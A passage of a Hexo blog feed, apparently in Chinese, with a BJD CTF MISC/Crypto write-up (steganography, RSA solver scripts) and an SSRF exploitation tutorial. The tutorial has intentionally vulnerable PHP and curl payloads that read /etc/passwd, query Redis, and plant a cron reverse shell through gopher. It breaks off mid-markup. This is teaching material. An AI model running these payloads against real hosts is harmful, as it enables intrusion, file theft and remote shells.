ae506f7ae8098d1d71797849b4ac8892b38d4b7a511a193b00d1db238d616949ccba9d390e6ec01c048c3a31326c4fcf9b7a1660a099c3ea87d426d52a42b859619b74da02b226ced10f72e552538147985b4d3c5a91404acac3c38d0fcf868de186470f81561d615b1971b545380dee38bdfb48f6b01854ff05c2c8c063b65bf6ddaf7e421181b26bbbbc530bd93ed96fbb837065fed07d6cb8f2202a41aa8723327072c0cc73fae4ece10b052e4ee5a5dceca8b34f82a9e6c715b862f17bda821fae5f2256ac17f07b37453be4aa1e49da9c00768dcb445c42118e3e68989bd9123dddec736b6bb70283f440b1136393649bbb4aa715df51de5e9b1f64d56271757f4300f221026307064bfe724e17a79368315a97590a7e74f038aa5c675874e598fad8adcfc73a8de4e5864742840b4ce92e773ac85a2fd8258d148c859cd3e3f478fc52d3168c4db58be971b71b49e77a2324230fbc1fcba43f4764f21b56845ef42f35cfa1f61099a137e7b1909b758b63b0321f29da2adaa23b6b4b0805e5a209b2ffa0b80f955e3bb9292588cbe74cddb90b4ca332395089cc16e67d3fe893ef65f092b900c1ff688cd70d7cf952804d0b92ecd8bd4ee3e05b1311bf053ee90644067bdaa615e2c64081afd25e821eca7b69c20512e2e09eeb20d1c58769c95fdb9d4c8e1a6db60c52f893bded3011e4690f37db76c13b63b64d52ddecf1600ad5ab9cf6664cdb55897cf0c26b95e9aa689c0181ab4126d986ddbb9c5fff41ecde54eddeac1859ace191ba8c4e0a7af462c719b1bae976bbb1c5686560edf5c3a4f291410675f3826d624ac55c70b6394194e68e5a11ab6885d90579a835179b00581741253c85b373696d71c0c0c28d76e02b2697836a097bfc3fdb087c311b27c5d74116631240b6b3144948b706d39c231b9018d3738107c4cdfbcd9a59e4a7f1c59964af1605070e5cda703d3c8c469792cb8110d56f5e6c9b874d197c7224db5e8f82e8197e49a9cab62831812dfeb7fe29cb53ea4901fc0657c86ef7c5da726eaf11abaa7d83c558fba1a684b9dd77eab8b4495a48e64aca79bfd0bbb283f696a6f82d43b31b870c1e5514196d260211ad88acdb98020092b9acd128f21f8527ae1b18e2fcc2f4d5fb0c4d40f1100e0743c2b70090e9a4de837478b3534582bb73f1b28ae84a1302545ce98171ba36fc2c8c1436ebfd9ce893692e3897b93b7368b5ce0d08247d7dbb5b1e9caca07e1a8c19386958b35d70c7e800a9890ca260ef86487167802dfce46d946299fddf439446936a9d22bef60e10179ed3ec02e9069041328caac286e0370659077ca27c3a4dd5d6cb7244b7f2ee646383a599ea9e550dc7d7a5ec87691e944732b99a6911d45855d99bc3795ba6b35b1b0a3f6ab80162ac5cb41f4ce5538e558a6d3d82e77b6c386c533dd0ffd163967c7a9375e4924cde66ccd9818b7bc2b553e4e41a7e8f8e0bc16985920991b4ab0aa91ea4c4c619258aa51018298a3534d2e108770b5b2adabf883280b00a06d99b89930d6f88835c9fade2796b9648e36bc6ff68de132947bc191b7d5358641d09c975f9e97ba2f49a096b46508a0e34fd31b5f6649c7ae9d3486422d56f893f26140e6ec5b9d845f8d36e6908b8e146ac8f6b599d2e04ef7ddd911015f909eac9f827d0df45a6cf552873794dd96441b86d1758be6d305545bf83f9a51ff73934c1221565d7d9cad7afc2ef35054dc06b57552945e44e6eb21ef61e3bc2ea864b808954e43845ee739c351edae5e76ce2b6dc8a171b930804ec3af7e0c28f17d172b3c02c020fd40254fd1fbe871275383fd6a5e34792adafd72f4d9f17b926264c54a85c75927846404424b7abbea08a93fcfd52439065790003b9e8e6a7157a183d4524a722e01403d8f9fbf08ec250ea6d6a56f33047f5453dac268f4daccc6112c10a90edcfbc0b8ac086645ded14014c0f685ab532861a2606b84f09cd57e7871ae871446bc38a37e1d4003e3dcb099f739fea83cb09bbe201c7aee7737c52ccadd6032a4cb9ece72d7f14ac10a53c8296fe7af87a57d45035f7a288c932806a734333f148fe7441146b5945d01275c55ade48a0403b387d64c747358253195e6639102d5188483ead6edc1869e19681d160132733d7c4d0ff4d23736364fa3280362d025cef14307d314d763fe1904114e907a398f176785697ac12601f986d9682976a3d43425ef7a04b8a1260e2008f8cb5d8b4e6679fc2a8d017468e115b738bfa03235c4d47e3e9312f2ea9fe3a15040c54d17a0d6c1321dc2a6cccb23fa9c1402843731ccaf2506d2e2488947b699d311e38a21ac24ab2be031f22300edb25dbadb7169fb1a20f2bc620a541ce</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届BJD CTF做题总结与题目复现-MISC&amp;Crypto</title>
      <link href="/2020/03/29/%E7%AC%AC%E4%BA%8C%E5%B1%8ABJD%20CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0-MISC&amp;Crypto/"/>
      <url>/2020/03/29/%E7%AC%AC%E4%BA%8C%E5%B1%8ABJD%20CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0-MISC&amp;Crypto/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上周参加了第二届BJD CTF，本Web dog太垃圾，就做出两道Web。不过还好MISC和Crypto做的还行。那就先总结复现一下。标<code>*</code>表示未作出的</p><h2 id="0x01-MISC"><a href="#0x01-MISC" class="headerlink" title="0x01 MISC"></a>0x01 MISC</h2><p>这个做的还行，不过有三道未做出(其中一道是mikutap。听，然后找按键盘进行对应，这个就算了，不想做)，好了开始复现</p><h3 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h3><p>就是简单的文件头填充。<br><img src="https://img-blog.csdnimg.cn/20200323213516845.jpg" alt="在这里插入图片描述"><br>看到IHDR，很明显想到png图片。添加文件头89504E47，改后缀，得到16进制<br>16进制转字符串即可得到flag</p><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>改图片高度即可</p><h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>这个就比较有趣了，直接用winrar打开得到<code>里面都是出题人.jpg</code>，进行格式分析发现是avi视频文件，改后缀播放，发现有东西，扔到Pr逐帧分析得到四张二维码。扫描得到4串十六进制<br>6167696E5F6C<br>6F76655F59<br>424A447B696D<br>316E677D<br>Hex-&gt;ASCII排序即可。</p><h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>winhex搜索BJD即可</p><h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="*Real_EasyBaBa"></a>*Real_EasyBaBa</h3><p>这个当时没做出来。看了官方wp发现最后一步去除所有0没有想到。。。。<br>png文件用winhex打开，搜索504B，将FFFF改为0304(可以先用binwalk分析下发现有zip，因为之前我做过类似的，所以就直接改),直接winrar打开<br><img src="https://img-blog.csdnimg.cn/2020032322034166.jpg" alt="在这里插入图片描述"><br>解压hint文件。打开是二维码，扫描得到命令<code>od -vtx1 ./draw.png | head -56 | tail -28</code><br><a href="https://www.cnblogs.com/kex1n/p/6101626.html" target="_blank" rel="noopener">linux之od命令</a><br>然后执行<code>od -vtx1 ./ezbb_r.png | head -56 | tail -28</code>这个命令，得到<br><img src="https://img-blog.csdnimg.cn/20200323221128944.jpg" alt="在这里插入图片描述"><br>然后就是我没想到的地方：把00字节去掉，得到图案即是flag</p><h3 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="*圣火昭昭"></a>*圣火昭昭</h3><p>这个找新佛语解密网站找了好久，以前都是佛语。。。。<br>下载图片查看属性，得到<code>新佛曰：</code>，以前要么没有这仨字，要么是<code>佛曰：</code>。<br><img src="https://img-blog.csdnimg.cn/20200323221821549.jpg" alt="在这里插入图片描述"><br>所以找到<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新佛语解密网站</a>，解密得到(hint说key去掉com，key应该就是gemlove)<br><img src="https://img-blog.csdnimg.cn/20200323222138416.jpg" alt="在这里插入图片描述"><br>试了下不是flag，应该是某种隐写的密码。然后没思路了，于是看看题目描述和群里管理员“<b>猜</b>”<br><img src="https://img-blog.csdnimg.cn/20200323223146616.jpg" alt="在这里插入图片描述"><br>发现“猜“这个字很魔性。然后我没见过类似的隐写，然后就断这里了。。<br>看了一眼官方wp发现是<code>outguess 隐写</code> ，没听说过。查了下，发现直接用一个工具即可。<br><strong>outguess的安装</strong>：</p><pre><code class="shell">git clone https://github.com/crorvick/outguess 进行下载下载完成后进入outguess文件夹，右击打开终端，执行命令：./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。</code></pre><p><strong>outguess的常见使用</strong>：</p><pre><code class="shell">对图片信息进行破解：outguess -r /root/qwzf.jpg hidden.txt带key的：加密：outguess -k &quot;abcd&quot; -d hidden.txt demo.jpg out.jpg解密：outguess -k &quot;abcd&quot; -r out.jpg hidden.txt</code></pre><p>好了，我直接执行<br><img src="https://img-blog.csdnimg.cn/20200323230109908.jpg" alt="在这里插入图片描述"><br>执行成功，打开qwzf.txt得到flag</p><h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="*TARGZ-y1ng"></a>*TARGZ-y1ng</h3><p><code>.tar.gz</code>文件直接用winrar解压发现需要输入密码，并不是伪加密，也爆破不出来。于是看看题目描述<br><img src="https://img-blog.csdnimg.cn/20200323230549158.jpg" alt="在这里插入图片描述"><br><code>tar zxvf</code>，即<code>tar -zxvf 压缩文件名</code>。还好linux学过，是<code>.gz</code>格式的解压缩并解打包。<br>试下linux解压缩并并解打包命令，然后发现依旧需要密码。密码在哪呢？<br>试试文件名。果然是解压密码。一直解一直解。好吧，我自闭了，不做了。<br>看官方wp写个脚本挺省事。但官方脚本有时候会报错(有关系统操作的脚本我还没学过怎么写，抽时间补下相关知识，然后再改下)。<br><code>decompress.py</code></p><pre><code class="python">import osimport filetypeimport timewhile 1:    aa = os.popen(&#39;ls&#39;)    filename = aa.read().replace(&#39;decompress.py&#39;,&#39;&#39;).replace(&#39;\n&#39;, &#39;&#39;)    a = filename.replace(&#39;.tar.gz&#39;, &#39;&#39;)    kind = filetype.guess(filename)    if kind.extension is &#39;zip&#39;:        os.system(&quot;mv {} {}.zip|unzip -P {} {}.zip&quot;.format(filename, a, a, a))        os.system(&quot;rm *.zip&quot;)        time.sleep(0.1)    else:        print(&#39;解压完成&#39;)        break</code></pre><p>执行脚本，得到flag文件。</p><h2 id="0x02-Crypto"><a href="#0x02-Crypto" class="headerlink" title="0x02 Crypto"></a>0x02 Crypto</h2><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="*老文盲了"></a>*老文盲了</h3><p>主要就是生僻汉字拼音，找个在线汉字转拼音即可<br><img src="https://img-blog.csdnimg.cn/20200324003111564.jpg" alt="在这里插入图片描述"><br>然后发现拼音再转换成汉字是<code>BJD{这就是flag直接交了吧}</code>，我交，不对。。。问了下群管理员，让我考虑下<code>&quot;这”还可能是什么？</code>emmmm，试了好多不对。。<br>看官方wp说花括号<code>{}</code>里的汉字再与之前的生僻字对应，也就是<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code><br>确定这是Crypto，感受到一丝MISC的味道。。</p><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p><img src="https://img-blog.csdnimg.cn/20200324004123903.jpg" alt="在这里插入图片描述"><br>这个呢，就比较简单了。每行8张小图片，<code>有吃的</code>、<code>无吃的</code>。很明显可能就是二进制嘛，8bit一个字节，刚刚好。手工转换下，得到</p><pre><code class="python">01000010010010100100010001111011010011010010000101100001001100000111111001111101</code></pre><p>然后二进制转ASCII，得到flag。还是感觉这道题也有MISC的感觉。</p><h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p><img src="https://img-blog.csdnimg.cn/20200324004911562.jpg" alt="在这里插入图片描述"><br>说实话，没见过，感觉是凯撒变种，但是搜不到。经别人提醒，知道是圣堂武士密码<br><img src="https://img-blog.csdnimg.cn/20200324005337498.png" alt="在这里插入图片描述"><br>对照着解密就ok了。。emmmmm，突然发现上边这解密图上的水印似乎是我的某位学长？？！！！<br>于是好奇的搜了下，发现一篇总结很全面的好文章：<br><strong><a href="https://blog.csdn.net/pdsu161530247/article/details/75667218" target="_blank" rel="noopener">CTF中Crypty（密码类）入门必看</a></strong></p><h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>题目：<br>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20<br>hex-&gt;ascii<br><img src="https://img-blog.csdnimg.cn/2020032400564778.jpg" alt="在这里插入图片描述"><br>yanzi应该是密钥，后边的是密文。于是开始尝试，由于最近刚看过维吉尼亚密码，所以尝试。果然是维吉尼亚密码加密，解密即可。<br><a href="https://www.cnblogs.com/inverseEntropy/p/10151176.html" target="_blank" rel="noopener">维吉尼亚密码加解密原理及其实现</a></p><h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="*Y1nglish-y1ng"></a>*Y1nglish-y1ng</h3><pre><code class="python">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot&#39;d z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf&#39;o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. &#39;Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,&#39; Pzffw ozqh,&#39;os tsn wse azt czw usf lw hqttkf!&#39; Tsn q nqbb vqjk wse npzd wse nztd.MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</code></pre><p>最近大致看了单表替换密码，然后尝试一下，发现不对，emmmm。。。<br>题目说是英语改过来的，然后就断了。现在看了眼wp：<br>直接找个在线的 cryptogram solver 即可解密，比如<a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a><br><img src="https://img-blog.csdnimg.cn/20200324012853622.jpg" alt="在这里插入图片描述"></p><blockquote><p>最后一单词是错误的，hint 也告知有个地方需要自己修正。 可以看上面那段话也可以发现 worying at a bany，应该是 working at a bank，还有 networy，很明显应该是 network，y 要改成 k；直接读也发现 cracy 这个单词不对劲，应该和暴力破解是同类型的词，所以改成 Cr4ck</p></blockquote><h3 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h3><p>这个和下一个RSA题确实不难，比较基础。然而我自己写的脚本没一点问题，但就是跑不出来flag。。。</p><pre><code class="python">e=14136631p+q=20394044353540319344698711597000763057241436261142332048783203085936171963637690670301311997609844966417898713277046255478343038988123359477656058456834000p-q=5522449249920590241682007593262770686168725602600804308006991053304611393109338497750661863149475602135542274713290715541748813086358892129600142665008034c=57564160274404219264177459450448019183275693200768416051436640755522202963653292172391840912536831571152913328785130833906878324669454383965866712212130750436153700289781965212722910455077455251018758850662752081666673050509850478470173282957056988779851401898604824247631281201497321682899672172658697366350flag=??????</code></pre><p>今天又试了下发现把除号<code>/</code>改为<code>//</code>就行了。。。吐血了。。。<br>我写的脚本如下：</p><pre><code class="python">import gmpy2#import binasciifrom Crypto.Util import numberx = 20394044353540319344698711597000763057241436261142332048783203085936171963637690670301311997609844966417898713277046255478343038988123359477656058456834000y = 5522449249920590241682007593262770686168725602600804308006991053304611393109338497750661863149475602135542274713290715541748813086358892129600142665008034c = 57564160274404219264177459450448019183275693200768416051436640755522202963653292172391840912536831571152913328785130833906878324669454383965866712212130750436153700289781965212722910455077455251018758850662752081666673050509850478470173282957056988779851401898604824247631281201497321682899672172658697366350p=(x+y)//2q=(x-y)//2e=14136631n=p*qphi_n = (p-1)*(q-1)d = gmpy2.invert(e,phi_n)m = pow(c, d, n)print(m)print(number.long_to_bytes(m))#print(binascii.a2b_hex(hex(m)[2:]).decode(&quot;utf8&quot;))</code></pre><p><img src="https://img-blog.csdnimg.cn/20200324152142118.jpg" alt="在这里插入图片描述"></p><h3 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h3><p>已知<code>p^2+q^2</code>和<code>p-q</code>，联立方程组可解出p,q<br>测试发现每访问一次，e和c都会变，但是<code>p^2+q^2</code>和<code>p-q</code>不变，于是考虑共模攻击：</p><pre><code class="python">import binasciifrom gmpy2 import invertdef egcd(a, b):    if a == 0:        return (b, 0, 1)    else:        g, y, x = egcd(b % a, a)        return (g, x - (b // a) * y, y)c1 = 51340645986680648867413444434228304851992739277782547454342697741865877392900511274202106134898112876825772319229557002425095759674232201185218757524610933637451782604059178975836061950941713112330334086056402131414410255457797205808339596344991620684466195920786350418186691414221753199930658493206062216077e1 = 13718357c2 = 34673873418492679189315841898257302722111171466584326793277718057977399831177294654520064866789128963244103911480691778143395640764793556758948086326518018815868320324938115520510369322851130777577637015710892435333961186906032753770892938649842321721053439688427769081850637260323730777408718564295395146991e2 = 13103833A = 120799346838375010895229335442462202865240248511497399986136417952902545991062894320724425829562051895373363854631133655790120865759504895601823054884863801257685969042479894585894024020955762745984438766369627115385495533880991887182178078779931382196022613790869270179113382812710158113446233023928865487250B = -1733107409224230289530192248905424424390530237061955853090172443573881253991888010586951250583196318203113989146388752129146692980400782011939285226398736n = (A-B**2)//2s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0:    s1 = - s1    c1 = invert(c1, n)elif s2&lt;0:    s2 = - s2    c2 = invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(binascii.a2b_hex(hex(m)[2:]).decode(&quot;utf8&quot;))</code></pre><p><img src="https://img-blog.csdnimg.cn/20200324153816103.jpg" alt="在这里插入图片描述"></p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>随便写写就那么多字了。。。算了，Web复现再另起一篇进行记录。做题和复现BJD MISC和Crypto，我又收获一波新知识：<code>新佛语解密</code>、<code>outguess隐写</code>、<code>多次输入密码解压压缩包脚本</code>、<code>圣堂武士密码</code>和<code>在线的cryptogram solver(quipqiup)</code>，似乎就收获那么多。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> Crypto </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞的利用与攻击内网应用</title>
      <link href="/2020/03/21/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/21/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>首发于先知社区</strong></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>学过CSRF漏洞后，收获颇多。同时发现SSRF漏洞和CSRF漏洞有一点点类似之处。<br>CSRF跨站请求伪造，基于客户端的请求伪造；SSRF服务器端请求伪造，基于服务端的请求伪造。<br>因为SSRF还没学习，所以还是先走上SSRF漏洞的学习之路吧！</p><h4 id="0x01-SSRF漏洞简介"><a href="#0x01-SSRF漏洞简介" class="headerlink" title="0x01 SSRF漏洞简介"></a>0x01 SSRF漏洞简介</h4><p><strong>1.SSRF漏洞概述</strong><br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<br>一般情况下，SSRF攻击的目标是从外网无法访问的<code>内部系统</code>。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）<br><img src="http://img-blog.csdnimg.cn/20200226013932770.png" alt="在这里插入图片描述"><br><strong>2.SSRF漏洞产生原因</strong><br>SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。<br>如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用<code>存在缺陷的web应用作为代理</code>攻击远程和本地的服务器。</p><p><strong>3.容易出现SSRF的地方</strong></p><ol><li>转码服务</li><li>在线翻译</li><li>图片加载与下载(通过URL地址加载或下载图片)</li><li>图片、文章收藏功能</li><li>网站采集、网页抓取的地方。</li><li>头像的地方。(远程加载头像)</li><li>一切要你输入网址的地方和可以输入ip的地方。</li><li>从URL关键字中寻找：<code>share</code>、<code>wap</code>、<code>url</code>、<code>link</code>、<code>src</code>、<code>source</code>、<code>target</code>、<code>u</code>、<code>3g</code>、<code>display</code>、<code>sourceURl</code>、<code>imageURL</code>、<code>domain</code><br>…</li></ol><p><strong>4.利用SSRF可以实现的攻击</strong></p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="http://www.cnblogs.com/yuanshu/p/11588341.html" target="_blank" rel="noopener">banner 信息</a></li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ol><h3 id="0x02-SSRF漏洞相关函数和协议"><a href="#0x02-SSRF漏洞相关函数和协议" class="headerlink" title="0x02 SSRF漏洞相关函数和协议"></a>0x02 SSRF漏洞相关函数和协议</h3><p><strong>1.函数</strong><br><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞<br>（1）file_get_contents()</p><pre><code class="php">&lt;?php$url = $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><blockquote><p><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p></blockquote><p>（2）fsockopen()</p><pre><code class="php">&lt;?php function GetFile($host,$port,$link) {     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);       if (!$fp) {         echo &quot;$errstr (error number $errno) \n&quot;;     } else {         $out = &quot;GET $link HTTP/1.1\r\n&quot;;         $out .= &quot;Host: $host\r\n&quot;;         $out .= &quot;Connection: Close\r\n\r\n&quot;;         $out .= &quot;\r\n&quot;;         fwrite($fp, $out);         $contents=&#39;&#39;;         while (!feof($fp)) {             $contents.= fgets($fp, 1024);         }         fclose($fp);         return $contents;     } }?&gt;</code></pre><blockquote><p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p></blockquote><p>（3）curl_exec()</p><pre><code class="php">&lt;?php if (isset($_POST[&#39;url&#39;])){    $link = $_POST[&#39;url&#39;];    $curlobj = curl_init();// 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源    $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;    file_put_contents($filename, $result);     echo $result;}?&gt;</code></pre><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话</p></blockquote><p><strong>注意</strong></p><pre><code class="php">1.一般情况下PHP不会开启fopen的gopher wrapper2.file_get_contents的gopher协议不能URL编码3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用5.curl_exec() //默认不跟踪跳转，6.file_get_contents() // file_get_contents支持php://input协议</code></pre><p><strong>2.协议</strong><br>（1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br>（2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>（3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>（4）<code>http/s</code>：探测内网主机存活</p><h3 id="0x03-SSRF漏洞利用"><a href="#0x03-SSRF漏洞利用" class="headerlink" title="0x03 SSRF漏洞利用"></a>0x03 SSRF漏洞利用</h3><h4 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h4><p>以curl举例，查看 curl 支持的协议列表 <code>curl -V</code>。<strong>本地利用方式</strong>：<br>（1）使用file协议   file protocol (任意文件读取)</p><pre><code class="shell">curl -vvv &#39;file:///etc/passwd&#39;</code></pre><p>（2）使用dict协议   dict protocol (获取Redis配置信息)</p><pre><code class="shell">curl -vvv &#39;dict://127.0.0.1:6379/info&#39;</code></pre><p>（3）使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)</p><pre><code class="shell">curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</code></pre><h4 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h4><h5 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h5><p>攻击机ip：192.168.201.129、121.36.67.230<br>攻击机：Kali、公网服务器<br>远程服务器ip：39.x.x.x<br>docker镜像：ssrf_redis<br>PHP版本：PHP Version 7.2.28(5.6版本测试会失败)</p><h5 id="2、远程利用示例代码"><a href="#2、远程利用示例代码" class="headerlink" title="2、远程利用示例代码"></a>2、远程利用示例代码</h5><p><code>ssrf.php</code></p><pre><code class="php">&lt;?php$ch = curl_init(); //创建新的 cURL 资源curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); //设置URL 和相应的选项#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_http);curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件curl_close($ch); ////关闭 cURL 资源，并且释放系统资源?&gt;</code></pre><p><code>post.php</code></p><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php    echo $_REQUEST[cmd];    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="3、远程利用方式"><a href="#3、远程利用方式" class="headerlink" title="3、远程利用方式"></a>3、远程利用方式</h5><p><strong>1.利用<code>file</code>协议</strong><br>任意文件读取</p><pre><code class="shell">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd&#39;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200314223649130.jpg" alt="在这里插入图片描述"><br><strong>2.利用<code>dict</code>协议</strong><br>（1）查看端口及端口上运行服务的版本信息</p><pre><code class="shell">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/&#39;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200315022633485.jpg" alt="在这里插入图片描述"><br>说明22端口开放<br>（2）通过dict协议getshell<br>有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上<code>\r\n</code>(CRLF)。<br>dict协议要一条一条的执行，而gopher协议执行一条命令就行了。<br><img src="http://img-blog.csdnimg.cn/2020031520301679.jpg" 